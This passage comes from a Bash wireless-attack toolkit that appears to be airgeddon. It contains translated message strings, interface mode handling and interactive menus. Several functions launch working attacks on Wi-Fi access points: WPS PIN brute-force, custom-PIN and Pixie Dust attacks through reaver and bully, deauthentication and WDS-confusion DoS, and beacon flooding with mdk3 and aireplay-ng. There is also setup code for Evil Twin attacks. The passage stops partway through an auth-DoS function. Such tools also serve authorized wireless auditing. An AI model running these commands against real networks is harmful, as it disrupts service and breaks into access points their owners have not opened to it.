	arr["ENGLISH",369]="To perform the Pixie Dust integrated attack with reaver or bully, you must have installed at least ${minimum_reaver_pixiewps_version} version for reaver and ${minimum_bully_pixiewps_version} for bully"
	arr["SPANISH",369]="Para realizar el ataque Pixie Dust integrado con reaver o con bully, has de tener instalada como mínimo la versión ${minimum_reaver_pixiewps_version} para reaver y ${minimum_bully_pixiewps_version} para bully"
	arr["FRENCH",369]="${pending_of_translation} Pour rendre le Pixie Dust intégré attaque reaver ou bully, vous devez avoir installé au moins le ${minimum_reaver_pixiewps_version} por reaver et ${minimum_bully_pixiewps_version} pour bully"
	arr["CATALAN",369]="${pending_of_translation} Per realitzar l'atac Pixie Dust integrat amb reaver o amb bully, has de tenir instal·lada com a mínim la versió ${minimum_reaver_pixiewps_version} per reaver i ${minimum_bully_pixiewps_version} per bully"
	arr["PORTUGUESE",369]="Para executar o ataque Pixie Dust com reaver ou bully, é necessário ter instalado pelo menos a versão ${minimum_reaver_pixiewps_version} para o reaver e ${minimum_bully_pixiewps_version} para o bully"
	arr["RUSSIAN",369]="Для выполнения интегрированной атаки Pixie Dust с reaver или bully, у вас должна быть установлена, по крайней мере, версия ${minimum_reaver_pixiewps_version} для reaver и ${minimum_bully_pixiewps_version} для bully"
	arr["GREEK",369]="Για να κάνετε την επίθεση Pixie Dust με ενσωματωμένο reaver ή bully, θα πρέπει να έχετε εγκαταστημένη τουλάχιστον την έκδοση ${minimum_reaver_pixiewps_version} για reaver και ${minimum_bully_pixiewps_version} για bully"

	arr["ENGLISH",370]="You have reaver installed (v${reaver_version}). You meet the version requirement to perform Pixie Dust integrated reaver attack (minimum version v${minimum_reaver_pixiewps_version}). Script can continue..."
	arr["SPANISH",370]="Tienes reaver instalado (v${reaver_version}). Cumples con el requisito de versión para realizar el ataque Pixie Dust integrado con reaver (versión minima v${minimum_reaver_pixiewps_version}). El script puede continuar..."
	arr["FRENCH",370]="${pending_of_translation} Vous reaver installé (v${reaver_version}). Vous répondez aux exigences de version pour le Pixie Dust intégré attaque reaver (version minimale v${minimum_reaver_pixiewps_version}). Le script peut continuer..."
	arr["CATALAN",370]="${pending_of_translation} Tens reaver instal·lat (v${reaver_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb reaver (versió mínima v${minimum_reaver_pixiewps_version}). El script pot continuar..."
	arr["PORTUGUESE",370]="Você tem o reaver instalado (v${reaver_version}). Você cumpre a exigência de versão para o ataque Pixie Dust com reaver (versão mínima v${minimum_reaver_pixiewps_version}). O script pode continuar..."
	arr["RUSSIAN",370]="У вас установлен reaver (v${reaver_version}). Версия удовлетворяет требованиям для выполнения интегрированной в reaver атаки Pixie Dust (минимальная версия v${minimum_reaver_pixiewps_version}). Скрипт может продолжить работу..."
	arr["GREEK",370]="Έχετε εγκατεστημένο το reaver (v${reaver_version}). Έχετε την απαραίτητη έκδοση reaver (ελάχιστη έκδοση v${minimum_reaver_pixiewps_version}), για την επίθεση Pixie Dust με ενσωματωμένο reaver. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",371]="You have reaver installed (v${reaver_version}), but not required version. To perform Pixie Dust integrated reaver attack you must have at least version v${minimum_reaver_pixiewps_version}"
	arr["SPANISH",371]="Tienes reaver instalado (v${reaver_version}), aunque no la versión requerida. Para realizar el ataque Pixie Dust integrado con reaver has de tener al menos la versión v${minimum_reaver_pixiewps_version}"
	arr["FRENCH",371]="${pending_of_translation} Vous reaver installé (v${reaver_version}), mais pas la version requise. Pour rendre l'attaque reaver intégrée Pixie Dust doit avoir au moins la version v${minimum_reaver_pixiewps_version}"
	arr["CATALAN",371]="${pending_of_translation} Tens reaver instal·lat (v${reaver_version}), encara que no la versió requerida. Per realitzar l'atac Pixie Dust integrat amb reaver has de tenir almenys la versió v${minimum_reaver_pixiewps_version}"
	arr["PORTUGUESE",371]="Você tem o reaver instalado (v${reaver_version}), mas não a versão necessária. Para fazer o ataque reaver integrado Pixie Dust tem que ter pelo menos a versão v${minimum_reaver_pixiewps_version}"
	arr["RUSSIAN",371]="У вас установлен reaver (v${reaver_version}), но не та версия, которая требуется. Для выполнения интегрированной в reaver атаки Pixie Dust у вас должна быть по крайней мере v${minimum_reaver_pixiewps_version}"
	arr["GREEK",371]="Έχετε εγκατεστημένο το reaver (v${reaver_version}), αλλά όχι την απαιτούμενη έκδοση. Για να κάνετε την επίθεση Pixie Dust με ενσωματωμένο reaver θα πρέπει να έχετε τουλάχιστον την έκδοση v${minimum_reaver_pixiewps_version}"

	case "${3}" in
		"yellow")
			interrupt_checkpoint "${2}" "${3}"
			echo_yellow "${arr[${1},${2}]}"
		;;
		"blue")
			echo_blue "${arr[${1},${2}]}"
		;;
		"red")
			echo_red "${arr[${1},${2}]}"
		;;
		"green")
			if [ "${2}" -ne ${abort_question} ]; then
				interrupt_checkpoint "${2}" "${3}"
			fi
			echo_green "${arr[${1},${2}]}"
		;;
		"pink")
			echo_pink "${arr[${1},${2}]}"
		;;
		"title")
			generate_dynamic_line "${arr[${1},${2}]}" "title"
		;;
		"read")
			interrupt_checkpoint "${2}" "${3}"
			read -p "${arr[${1},${2}]}" -r
		;;
		"multiline")
			echo -ne "${arr[${1},${2}]}"
		;;
		"hint")
			echo_brown "${hintvar} ${pink_color}${arr[${1},${2}]}"
		;;
		"separator")
			generate_dynamic_line "${arr[${1},${2}]}" "separator"
		;;
		"under_construction")
			echo_red_slim "${arr[${1},${2}]} (${under_constructionvar})"
		;;
		*)
			if [ -z "${3}" ]; then
				last_echo "${arr[${1},${2}]}" "${normal_color}"
			else
				special_text_missed_optional_tool "${1}" "${2}" "${3}"
			fi
		;;
	esac
}

#Set the message to show again after an interrupt ([Ctrl+C] or [Ctrl+Z]) without exiting
function interrupt_checkpoint() {

	if [ -z "${last_buffered_type1}" ]; then
		last_buffered_message1=${1}
		last_buffered_message2=${1}
		last_buffered_type1=${2}
		last_buffered_type2=${2}
	else
		if [ "${1}" -ne ${resume_message} ]; then
			last_buffered_message2=${last_buffered_message1}
			last_buffered_message1=${1}
			last_buffered_type2=${last_buffered_type1}
			last_buffered_type1=${2}
		fi
	fi
}

#Add the text on a menu when you miss an optional tool
function special_text_missed_optional_tool() {

	declare -a required_tools=("${!3}")

	allowed_menu_option=1
	if [ ${debug_mode} -eq 0 ]; then
		tools_needed="${optionaltool_needed[${1}]}"
		for item in "${required_tools[@]}"; do
			if [ "${optional_tools[${item}]}" -eq 0 ]; then
				allowed_menu_option=0
				tools_needed+="${item} "
			fi
		done
	fi

	if [ ${allowed_menu_option} -eq 1 ]; then
		last_echo "${arr[${1},${2}]}" "${normal_color}"
	else
		[[ ${arr[${1},${2}]} =~ ^([0-9]+)\.(.*)$ ]] && forbidden_options+=("${BASH_REMATCH[1]}")
		tools_needed=${tools_needed:: -1}
		echo_red_slim "${arr[${1},${2}]} (${tools_needed})"
	fi
}

#Generate the chars in front of and behind a text for titles and separators
function generate_dynamic_line() {

	local type=${2}
	if [ "${type}" = "title" ]; then
		ncharstitle=78
		titlechar="*"
	elif [ "${type}" = "separator" ]; then
		ncharstitle=58
		titlechar="-"
	fi

	titletext=${1}
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ "${type}" = "title" ]; then
		finaltitle="${finaltitle} ${titletext} "
	elif [ "${type}" = "separator" ]; then
		finaltitle="${finaltitle} (${titletext}) "
	fi

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ $((titlelength % 2)) -gt 0 ]; then
		finaltitle+="${titlechar}"
	fi

	if [ "${type}" = "title" ]; then
		echo_red "${finaltitle}"
	elif [ "${type}" = "separator" ]; then
		echo_blue "${finaltitle}"
	fi
}

#Wrapper to check managed mode on an interface
function check_to_set_managed() {

	check_interface_mode
	case "${ifacemode}" in
		"Managed")
			echo
			language_strings "${language}" 0 "yellow"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 1 "yellow"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Wrapper to check monitor mode on an interface
function check_to_set_monitor() {

	check_interface_mode
	case "${ifacemode}" in
		"Monitor")
			echo
			language_strings "${language}" 10 "yellow"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 13 "yellow"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Check for monitor mode on an interface
function check_monitor_enabled() {

	mode=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)

	if [[ ${mode} != "Monitor" ]]; then
		echo
		language_strings "${language}" 14 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi
	return 0
}

#Check if an interface is a wifi card or not
function check_interface_wifi() {

	execute_iwconfig_fix
	return $?
}

#Execute the iwconfig fix to know if an interface is a wifi card or not
function execute_iwconfig_fix() {

	iwconfig_fix
	iwcmd="iwconfig ${interface} ${iwcmdfix} > /dev/null 2> /dev/null"
	eval "${iwcmd}"

	return $?
}

#Create a list of interfaces associated to its macs
function renew_ifaces_and_macs_list() {

	readarray -t IFACES_AND_MACS < <(ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v | grep "${interface}" -v)
	declare -gA ifaces_and_macs
	for iface_name in "${IFACES_AND_MACS[@]}"; do
		mac_item=$(cat < "/sys/class/net/${iface_name}/address" 2> /dev/null)
		if [ -n "${mac_item}" ]; then
			ifaces_and_macs[${iface_name}]=${mac_item}
		fi
	done

	declare -gA ifaces_and_macs_switched
	for iface_name in "${!ifaces_and_macs[@]}"; do
		ifaces_and_macs_switched[${ifaces_and_macs[${iface_name}]}]=${iface_name}
	done
}

#Check the interface coherence between interface names and macs
function check_interface_coherence() {

	renew_ifaces_and_macs_list
	interface_auto_change=0

	interface_found=0
	for iface_name in "${!ifaces_and_macs[@]}"; do
		if [ "${interface}" = "${iface_name}" ]; then
			interface_found=1
			interface_mac=${ifaces_and_macs[${iface_name}]}
			break
		fi
	done

	if [ ${interface_found} -eq 0 ]; then
		for iface_mac in "${ifaces_and_macs[@]}"; do
			iface_mac_tmp=${iface_mac:0:15}
			interface_mac_tmp=${interface_mac:0:15}
			if [ "${iface_mac_tmp}" = "${interface_mac_tmp}" ]; then
				interface=${ifaces_and_macs_switched[${iface_mac}]}
				interface_auto_change=1
				break
			fi
		done
	fi

	return ${interface_auto_change}
}

#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
function prepare_et_monitor() {

	disable_rfkill

	phy_iface=$(basename "$(readlink "/sys/class/net/${interface}/phy80211")")
	iface_phy_number=${phy_iface:3:1}
	iface_monitor_et_deauth="mon${iface_phy_number}"

	iw phy "${phy_iface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
	ifconfig "${iface_monitor_et_deauth}" up > /dev/null 2>&1
	iwconfig "${iface_monitor_et_deauth}" channel "${channel}" > /dev/null 2>&1
}

#Assure the mode of the interface before the Evil Twin process
function prepare_et_interface() {

	et_initial_state=${ifacemode}

	if [ "${ifacemode}" != "Managed" ]; then
		new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station)
		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
		if [ "${interface}" != "${new_interface}" ]; then
			check_interface_coherence
			if [ "$?" = "0" ]; then
				interface=${new_interface}
			fi
			echo
			language_strings "${language}" 15 "yellow"
		fi
	fi
}

#Restore the state of the interfaces after Evil Twin process
function restore_et_interface() {

	echo
	language_strings "${language}" 299 "blue"

	disable_rfkill

	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1

	if [ "${et_initial_state}" = "Managed" ]; then
		ifconfig "${interface}" down > /dev/null 2>&1
		iwconfig "${interface}" mode managed > /dev/null 2>&1
		ifconfig "${interface}" up > /dev/null 2>&1
	else
		new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
		if [ "${interface}" != "${new_interface}" ]; then
			interface=${new_interface}
		fi
	fi
}

#Unblock if possible the interface if blocked
function disable_rfkill() {

	if hash rfkill 2> /dev/null; then
		rfkill unblock all > /dev/null 2>&1
	fi
}

#Put the interface on managed mode and manage the possible name change
function managed_option() {

	check_to_set_managed

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings "${language}" 17 "blue"
	ifconfig "${interface}" up

	new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station)
	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

	if [ "${interface}" != "${new_interface}" ]; then
		check_interface_coherence
		if [ "$?" = "0" ]; then
			interface=${new_interface}
		fi
		echo
		language_strings "${language}" 15 "yellow"
	fi

	echo
	language_strings "${language}" 16 "yellow"
	language_strings "${language}" 115 "read"
}

#Put the interface on monitor mode and manage the possible name change
function monitor_option() {

	check_to_set_monitor

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings "${language}" 18 "blue"

	ifconfig "${interface}" up
	iwconfig "${interface}" rate 1M > /dev/null 2>&1

	if [ "$?" != "0" ]; then
		echo
		language_strings "${language}" 20 "yellow"
		language_strings "${language}" 115 "read"
		return
	fi

	if [ "${check_kill_needed}" -eq 1 ]; then
		language_strings "${language}" 19 "blue"
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	fi

	new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

	if [ "${interface}" != "${new_interface}" ]; then
		check_interface_coherence
		if [ "$?" = "0" ]; then
			interface=${new_interface}
		fi
		echo
		language_strings "${language}" 21 "yellow"
	fi

	echo
	language_strings "${language}" 22 "yellow"
	language_strings "${language}" 115 "read"
}

#Check the interface mode
function check_interface_mode() {

	execute_iwconfig_fix
	if [[ "$?" != "0" ]]; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1)

	if [[ ${modemanaged} = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)

	if [[ ${modemonitor} = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings "${language}" 23 "yellow"
	language_strings "${language}" 115 "read"
	exit_code=1
	exit_script_option
}

#Language change menu
function language_menu() {

	clear
	language_strings "${language}" 87 "title"
	current_menu="language_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 81 "green"
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	print_hint ${current_menu}

	read -r language_selected
	echo
	case ${language_selected} in
		1)
			if [ "${language}" = "ENGLISH" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="ENGLISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		2)
			if [ "${language}" = "SPANISH" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="SPANISH"
				language_strings "${language}" 84 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		3)
			if [ "${language}" = "FRENCH" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="FRENCH"
				language_strings "${language}" 112 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		4)
			if [ "${language}" = "CATALAN" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="CATALAN"
				language_strings "${language}" 117 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		5)
			if [ "${language}" = "PORTUGUESE" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="PORTUGUESE"
				language_strings "${language}" 248 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		6)
			if [ "${language}" = "RUSSIAN" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="RUSSIAN"
				language_strings "${language}" 307 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		7)
			if [ "${language}" = "GREEK" ]; then
				language_strings "${language}" 251 "yellow"
			else
				language="GREEK"
				language_strings "${language}" 332 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		*)
			invalid_language_selected
		;;
	esac
}

#Read the chipset for an interface
function set_chipset() {

	chipset=""
	sedrule1="s/^....//"
	sedrule2="s/ Network Connection//g"
	sedrule3="s/ Wireless Adapter//"
	sedrule4="s/Wireless LAN Controller //g"
	sedrule5="s/ Wireless Adapter//"
	sedrule6="s/^ //"
	sedrule7="s/ Gigabit Ethernet.*//"
	sedrule8="s/ Fast Ethernet.*//"
	sedrule9="s/ \[.*//"
	sedrule10="s/ (.*//"

	sedrulewifi="${sedrule1};${sedrule2};${sedrule3};${sedrule6}"
	sedrulegeneric="${sedrule4};${sedrule2};${sedrule5};${sedrule6};${sedrule7};${sedrule8};${sedrule9};${sedrule10}"
	sedruleall="${sedrule1};${sedrule2};${sedrule3};${sedrule6};${sedrule7};${sedrule8};${sedrule9};${sedrule10}"

	if [ -f "/sys/class/net/${1}/device/modalias" ]; then

		bus_type=$(cat < "/sys/class/net/${1}/device/modalias" | cut -d ":" -f 1)

		if [ "${bus_type}" = "usb" ]; then
			vendor_and_device=$(cat < "/sys/class/net/${1}/device/modalias" | cut -d ":" -f 2 | cut -b 1-10 | sed 's/^.//;s/p/:/')
			chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n1 - | cut -f3- -d ":" | sed "${sedrulewifi}")

		elif [[ "${bus_type}" =~ pci|ssb|bcma|pcmcia ]]; then

			if [[ -f /sys/class/net/${1}/device/vendor && -f /sys/class/net/${1}/device/device ]]; then
				vendor_and_device=$(cat "/sys/class/net/${1}/device/vendor"):$(cat "/sys/class/net/${1}/device/device")
				chipset=$(lspci -d "${vendor_and_device}" | cut -f3- -d ":" | sed "${sedrulegeneric}")
			else
				if hash ethtool 2> /dev/null; then
					ethtool_output=$(ethtool -i "${1}" 2>&1)
					vendor_and_device=$(printf "%s" "${ethtool_output}" | grep bus-info | cut -d ":" -f "3-" | sed 's/^ //')
					chipset=$(lspci | grep "${vendor_and_device}" | head -n1 - | cut -f3- -d ":" | sed "${sedrulegeneric}")
				fi
			fi
		fi
	elif [[ -f /sys/class/net/${1}/device/idVendor && -f /sys/class/net/${1}/device/idProduct ]]; then
		vendor_and_device=$(cat "/sys/class/net/${1}/device/idVendor"):$(cat "/sys/class/net/${1}/device/idProduct")
		chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n1 - | cut -f3- -d ":" | sed "${sedruleall}")
	fi
}

#Internet interface selection menu
function select_internet_interface() {

	if [ "${return_to_et_main_menu}" -eq 1 ]; then
		return 1
	fi

	current_menu="evil_twin_attacks_menu"
	clear
	case ${et_mode} in
		"et_onlyap")
			language_strings "${language}" 270 "title"
		;;
		"et_sniffing")
			language_strings "${language}" 291 "title"
		;;
		"et_sniffing_sslstrip")
			language_strings "${language}" 292 "title"
		;;
		"et_captive_portal")
			language_strings "${language}" 293 "title"
		;;
	esac

	inet_ifaces=$(ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v | grep "${interface}" -v)

	option_counter=0
	for item in ${inet_ifaces}; do

		if [ ${option_counter} -eq 0 ]; then
			language_strings "${language}" 279 "green"
			print_simple_separator
		fi

		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset "${item}"
		echo -ne "${option_counter}.${spaceiface}${item} "
		if [ "${chipset}" = "" ]; then
			language_strings "${language}" 245 "blue"
		else
			echo -e "${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
		fi
	done

	if [ ${option_counter} -eq 0 ]; then
		return_to_et_main_menu=1
		echo
		language_strings "${language}" 280 "yellow"
		language_strings "${language}" 115 "read"
		return 1
	fi

	option_counter_back=$((option_counter + 1))
	if [ ${option_counter: -1} -eq 9 ]; then
		spaceiface+=" "
	fi
	print_simple_separator
	language_strings "${language}" 331
	print_hint ${current_menu}

	read -r inet_iface
	if [ -z "${inet_iface}" ]; then
		invalid_internet_iface_selected
	elif [[ ${inet_iface} -lt 1 ]] || [[ ${inet_iface} -gt ${option_counter_back} ]]; then
		invalid_internet_iface_selected
	elif [ "${inet_iface}" -eq ${option_counter_back} ]; then
		return_to_et_main_menu=1
		return 1
	else
		option_counter2=0
		for item2 in ${inet_ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${inet_iface}" = "${option_counter2}" ]]; then
				internet_interface=${item2}
				break
			fi
		done
		return 0
	fi
}

#Interface selection menu
function select_interface() {

	clear
	language_strings "${language}" 88 "title"
	current_menu="select_interface_menu"
	language_strings "${language}" 24 "green"
	print_simple_separator
	ifaces=$(ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v)
	option_counter=0
	for item in ${ifaces}; do
		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset "${item}"
		echo -ne "${option_counter}.${spaceiface}${item} "
		if [ "${chipset}" = "" ]; then
			language_strings "${language}" 245 "blue"
		else
			echo -e "${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
		fi
	done
	print_hint ${current_menu}

	read -r iface
	if [ -z "${iface}" ]; then
		invalid_iface_selected
	elif [[ ${iface} -lt 1 ]] || [[ ${iface} -gt ${option_counter} ]]; then
		invalid_iface_selected
	else
		option_counter2=0
		for item2 in ${ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${iface}" = "${option_counter2}" ]]; then
				interface=${item2}
				interface_mac=$(ip link show "${interface}" | awk '/ether/ {print $2}')
				break
			fi
		done
	fi
}

#Read the user input on yes/no questions
function read_yesno() {

	echo
	language_strings "${language}" "${1}" "green"
	read -r yesno
}

#Validate the input on yes/no questions
function ask_yesno() {

	yesno=""
	while [[ ! ${yesno} =~ ^[YyNn]$ ]]; do
		read_yesno "${1}"
	done

	if [ "${yesno}" = "Y" ]; then
		yesno="y"
	fi
	if [ "${yesno}" = "N" ]; then
		yesno="n"
	fi
}

#Read the user input on channel questions
function read_channel() {

	echo
	language_strings "${language}" 25 "green"
	if [ "${1}" = "wps" ]; then
		read -r wps_channel
	else
		read -r channel
	fi
}

#Validate the input on channel questions
function ask_channel() {

	local regexp="^([1-9]|1[0-4])$"

	if [ "${1}" = "wps" ]; then
		while [[ ! ${wps_channel} =~ ${regexp} ]]; do
			read_channel "wps"
		done
		echo
		language_strings "${language}" 365 "blue"
	else
		while [[ ! ${channel} =~ ${regexp} ]]; do
			read_channel
		done
		echo
		language_strings "${language}" 26 "blue"
	fi
}

#Read the user input on bssid questions
function read_bssid() {

	echo
	language_strings "${language}" 27 "green"
	if [ "${1}" = "wps" ]; then
		read -r wps_bssid
	else
		read -r bssid
	fi
}

#Validate the input on bssid questions
function ask_bssid() {

	local regexp="^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$"

	if [ "${1}" = "wps" ]; then
		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
			read_bssid "wps"
		done
		echo
		language_strings "${language}" 364 "blue"
	else
		while [[ ! ${bssid} =~ ${regexp} ]]; do
			read_bssid
		done
		echo
		language_strings "${language}" 28 "blue"
	fi
}

#Read the user input on essid questions
function read_essid() {

	echo
	language_strings "${language}" 29 "green"
	read -r essid
}

#Validate the input on essid questions
function ask_essid() {

	if [ -z "${essid}" ]; then
		while [[ -z "${essid}" ]]; do
			read_essid
		done
	elif [ "${essid}" = "(Hidden Network)" ]; then
		echo
		language_strings "${language}" 30 "yellow"
		read_essid
	fi

	echo
	language_strings "${language}" 31 "blue"
}

#Read the user input on custom pin questions
function read_custom_pin() {

	echo
	language_strings "${language}" 363 "green"
	read -r custom_pin
}

#Validate the input on custom pin questions
function ask_custom_pin() {

	local regexp="^[0-9]{8}$"
	custom_pin=""
	while [[ ! ${custom_pin} =~ ${regexp} ]]; do
		read_custom_pin
	done

	echo
	language_strings "${language}" 362 "blue"
}

#Execute wps custom pin bully attack
function exec_wps_custom_pin_bully_attack() {

	echo
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -L -F -B -p ${custom_pin} -v ${bully_verbosity} && echo \"Close this window\"" > /dev/null 2>&1
}

#Execute wps custom pin reaver attack
function exec_wps_custom_pin_reaver_attack() {

	echo
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -p ${custom_pin} -a -g 1 -vvv && echo \"Close this window\"" > /dev/null 2>&1
}

#Execute bully pixie dust attack
function exec_bully_pixiewps_attack() {

	echo
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -d -v ${bully_verbosity} && echo \"Close this window\"" > /dev/null 2>&1
}

#Execute reaver pixie dust attack
function exec_reaver_pixiewps_attack() {

	echo
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -K 1 -vvv && echo \"Close this window\"" > /dev/null 2>&1
}

#Execute wps bruteforce pin bully attack
function exec_wps_bruteforce_pin_bully_attack() {

	echo
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin bully attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -L -F -B -v ${bully_verbosity} && echo \"Close this window\"" > /dev/null 2>&1
}

#Execute wps bruteforce pin reaver attack
function exec_wps_bruteforce_pin_reaver_attack() {

	echo
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -a -vvv && echo \"Close this window\"" > /dev/null 2>&1
}

#Execute mdk3 deauth DoS attack
function exec_mdk3deauth() {

	echo
	language_strings "${language}" 89 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	echo "${bssid}" > "${tmpdir}bl.txt"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
}

#Execute aireplay DoS attack
function exec_aireplaydeauth() {

	echo
	language_strings "${language}" 90 "title"
	language_strings "${language}" 32 "green"

	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
}

#Execute WDS confusion DoS attack
function exec_wdsconfusion() {

	echo
	language_strings "${language}" 91 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
}

#Execute Beacon flood DoS attack
function exec_beaconflood() {

	echo
	language_strings "${language}" 92 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
}

#Execute Auth DoS attack
function exec_authdos() {

	echo
	language_strings "${language}" 93 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
